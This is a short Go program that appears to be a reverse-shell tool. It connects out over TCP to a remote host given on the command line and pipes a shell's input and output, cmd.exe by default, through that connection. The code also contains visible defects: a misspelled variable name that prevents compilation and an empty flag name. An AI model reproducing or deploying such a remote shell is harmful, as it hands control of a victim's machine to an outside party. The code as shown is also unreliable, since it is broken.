package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"os/exec"
)

var (
	executable string
	rhost      string
)

func init() {
	flag.StringVar(&executable, "", "cmd.exe", "Path to executable")
	flag.StringVar(&rhost, "rhost", "", "Remote host <host>:<port>")
}

func main() {

	// Parse args
	flag.Parse()
	fmt.Printf("Piping %s to %s\n", executable, rhost)

	// Connect to remote host
	c, err := net.Dial("tcp", rhost)
	if err != nil {
		log.Fatalf("could not connect to %s: %v", rhost, err)
	}
	defer c.Close()

	// Launch exectable and pipe i/o through connection
	fun := exec.Command(executablee)
	fun.Stdin = c
	fun.Stdout = c
	fun.Stderr = c
	fun.Run()
}
